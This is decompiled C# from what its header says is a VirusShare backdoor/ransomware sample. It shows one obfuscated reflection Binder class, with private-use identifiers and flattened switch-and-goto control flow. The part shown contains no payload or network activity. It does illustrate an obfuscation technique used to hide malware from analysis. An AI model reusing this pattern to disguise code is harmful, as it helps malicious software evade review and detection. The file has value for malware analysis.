// Decompiled with JetBrains decompiler
// Type: 
// Assembly: Protected, Version=6.2.8400.0, Culture=neutral, PublicKeyToken=null
// MVID: 52CBE997-50C3-42B2-A704-C908D57869A5
// Assembly location: C:\Users\Administrateur\Downloads\VirusShare_CryptoRansom_20160715-msil\HEUR-Backdoor.Win32.Generic-2a8dca5794c095ea67845468a3fd0a8e91a24bf3f0bb5e0ec6c16a6579cc4e90.exe

using System;
using System.Globalization;
using System.Reflection;

internal sealed class \uE027 : Binder
{
  private Type \uE000;
  private Type[] \uE001;
  private bool \uE002;

  public \uE027(Type _param1) => this.\uE000 = _param1;

  public \uE027(Type _param1, Type[] _param2)
  {
    this.\uE000 = _param1;
    this.\uE001 = _param2;
    this.\uE002 = (_param2 == null ? 1 : 0) == 0 && _param2.Length > 0;
  }

  public override FieldInfo BindToField(
    BindingFlags bindingAttr,
    FieldInfo[] match,
    object value,
    CultureInfo culture)
  {
    FieldInfo[] fieldInfoArray = (match == null ? 0 : 1) != 0 ? match : throw new ArgumentNullException(nameof (match));
label_6:
    int num1 = \uE026.\uE000(39);
    int num2 = -12;
    FieldInfo field;
    while (true)
    {
      switch ((num2 ^ 45) + 41)
      {
        case 0:
          goto label_6;
        case 1:
          int index;
          int num3;
          switch (num1)
          {
            case 38:
              if (field.GetType().Equals(value.GetType()))
              {
                num1 = 6;
                goto label_3;
              }
              else
              {
                num3 = 1;
                break;
              }
            case 39:
              index = 0;
              num1 = 5;
              goto label_3;
            case 40:
label_12:
              field = fieldInfoArray[index];
              num1 = 10;
              goto label_3;
            case 41:
              if (index != 0)
              {
                num1 = \uE000.\uE000(46);
                goto label_3;
              }
              else
                goto label_20;
            case 42:
              num3 = 0;
              break;
            default:
              num2 = -6;
              continue;
          }
          if (num3 != 0)
            ++index;
          else
            goto label_18;
label_20:
          if (index < fieldInfoArray.Length)
            goto label_12;
          else
            goto label_21;
        case 2:
label_3:
          num1 ^= 44;
          break;
      }
      num2 = \uE026.\uE000(24);
    }
label_18:
    return field;
label_21:
    return (FieldInfo) null;
  }

  public override MethodBase BindToMethod(
    BindingFlags bindingAttr,
    MethodBase[] match,
    ref object[] args,
    ParameterModifier[] modifiers,
    CultureInfo culture,
    string[] names,
    out object state)
  {
    if ((match == null ? 0 : 1) == 0)
      throw new ArgumentNullException(nameof (match));
    state = (object) null;
label_6:
    int num1 = \uE026.\uE000(37);
    int num2 = 13;
    MethodBase method;
    while (true)
    {
      switch (num2 ^ 38)
      {
        case 41:
          goto label_6;
        case 42:
          int index;
          MethodBase[] methodBaseArray;
          int num3;
          switch (num1 + 43)
          {
            case 0:
              if (this.\uE002)
              {
                num1 = -2;
                goto label_3;
              }
              else
              {
                num3 = 1;
                break;
              }
            case 1:
              methodBaseArray = match;
              num1 = \uE000.\uE000(45);
              goto label_3;
            case 2:
              if (index != 0)
              {
                num1 = -3;
                goto label_3;
              }
              else
                goto label_21;
            case 3:
              index = 0;
              num1 = -13;
              goto label_3;
            case 4:
label_15:
              method = methodBaseArray[index];
              num1 = -15;
              goto label_3;
            case 5:
              num3 = 0;
              break;
            default:
              num2 = 15;
              continue;
          }
          if (num3 == 0 && (!method.IsGenericMethodDefinition ? 1 : 0) != 0 || (!this.\uE002 ? 0 : 1) == 0 && (!method.IsGenericMethodDefinition ? 0 : 1) != 0 || (!this.\uE000(method.GetParameters(), args) ? 1 : 0) != 0)
            ++index;
          else
            goto label_19;
label_21:
          if (index < methodBaseArray.Length)
            goto label_15;
          else
            goto label_22;
        case 43:
label_3:
          num1 ^= 36;
          break;
      }
      num2 = \uE026.\uE000(31);
    }
label_19:
    return method;
label_22:
    return (MethodBase) null;
  }

  public override object ChangeType(object value, Type type, CultureInfo culture)
  {
    try
    {
      return Convert.ChangeType(value, type);
    }
    catch (InvalidCastException ex)
    {
      return (object) null;
    }
  }

  public override void ReorderArgumentArray(ref object[] args, object state)
  {
  }

  public override MethodBase SelectMethod(
    BindingFlags bindingAttr,
    MethodBase[] match,
    Type[] types,
    ParameterModifier[] modifiers)
  {
    if ((match == null ? 0 : 1) == 0)
      throw new ArgumentNullException(nameof (match));
    int index = 0;
label_6:
    int num1 = \uE000.\uE000(40);
    int num2 = 14;
    MethodBase methodBase;
    while (true)
    {
      switch (num2 ^ 38)
      {
        case 38:
          goto label_6;
        case 39:
          int num3;
          switch (num1)
          {
            case 43:
label_9:
              methodBase = match[index];
              num1 = 15;
              goto label_3;
            case 44:
              if (index != 0)
              {
                num1 = 9;
                goto label_3;
              }
              else
                goto label_26;
            case 45:
              if (this.\uE002)
              {
                num1 = \uE026.\uE000(31);
                goto label_3;
              }
              else
              {
                num3 = 1;
                break;
              }
            case 46:
              num3 = 0;
              break;
            default:
              num2 = 0;
              continue;
          }
          if (num3 == 0)
          {
            if ((!methodBase.IsGenericMethodDefinition ? 1 : 0) != 0 || methodBase.GetGenericArguments().Length != this.\uE001.Length)
              goto label_25;
          }
          else if ((!methodBase.IsGenericMethodDefinition ? 0 : 1) != 0)
            goto label_25;
          if (((object) (methodBase as MethodInfo) == null ? 1 : 0) == 0)
          {
            MethodInfo methodInfo = (MethodInfo) methodBase;
            if ((!this.\uE002 ? 1 : 0) == 0)
              methodBase = (MethodBase) (methodInfo = methodInfo.MakeGenericMethod(this.\uE001));
            if ((!methodInfo.ReturnType.Equals(this.\uE000) ? 1 : 0) != 0)
              goto label_25;
          }
          if ((!\uE027.\uE000(methodBase.GetParameters(), types) ? 1 : 0) == 0)
            goto label_24;
label_25:
          ++index;
label_26:
          if (index < match.Length)
            goto label_9;
          else
            goto label_27;
        case 40:
label_3:
          num1 ^= 34;
          break;
      }
      num2 = \uE026.\uE000(30);
    }
label_24:
    return methodBase;
label_27:
    return (MethodBase) null;
  }

  public override PropertyInfo SelectProperty(
    BindingFlags bindingAttr,
    PropertyInfo[] match,
    Type returnType,
    Type[] indexes,
    ParameterModifier[] modifiers)
  {
    PropertyInfo[] propertyInfoArray = (match == null ? 0 : 1) != 0 ? match : throw new ArgumentNullException(nameof (match));
label_6:
    int num1 = \uE026.\uE000(28);
    int num2 = -3;
    PropertyInfo propertyInfo;
    while (true)
    {
      switch ((num2 ^ 42) + 43)
      {
        case 0:
          goto label_6;
        case 1:
          int index;
          int num3;
          switch (num1 + 36)
          {
            case 0:
              if (propertyInfo.GetType().Equals(returnType))
              {
                num1 = \uE000.\uE000(36);
                goto label_3;
              }
              else
              {
                num3 = 1;
                break;
              }
            case 1:
              index = 0;
              num1 = -6;
              goto label_3;
            case 2:
label_12:
              propertyInfo = propertyInfoArray[index];
              num1 = -7;
              goto label_3;
            case 3:
              if (index != 0)
              {
                num1 = -5;
                goto label_3;
              }
              else
                goto label_20;
            case 4:
              num3 = 0;
              break;
            default:
              num2 = -1;
              continue;
          }
          if (num3 != 0 || (!\uE027.\uE000(propertyInfo.GetIndexParameters(), indexes) ? 1 : 0) != 0)
            ++index;
          else
            goto label_18;
label_20:
          if (index < propertyInfoArray.Length)
            goto label_12;
          else
            goto label_21;
        case 2:
label_3:
          num1 ^= 37;
          break;
      }
      num2 = \uE000.\uE000(45);
    }
label_18:
    return propertyInfo;
label_21:
    return (PropertyInfo) null;
  }

  private bool \uE000(ParameterInfo[] _param1, object[] _param2)
  {
    if (_param1.Length != _param2.Length)
      return false;
    int index = 0;
    if (index == 0)
      goto label_6;
label_3:
    if ((!_param1[index].ParameterType.Equals(_param2[index].GetType()) ? 0 : 1) == 0)
      return false;
    ++index;
label_6:
    if (index >= _param1.Length)
      return true;
    goto label_3;
  }

  private static bool \uE000(ParameterInfo[] _param0, Type[] _param1)
  {
    if (_param0.Length != _param1.Length)
      return false;
    int index = 0;
    if (index == 0)
      goto label_6;
label_3:
    if ((!_param0[index].ParameterType.Equals(_param1[index]) ? 0 : 1) == 0)
      return false;
    ++index;
label_6:
    if (index >= _param0.Length)
      return true;
    goto label_3;
  }
}
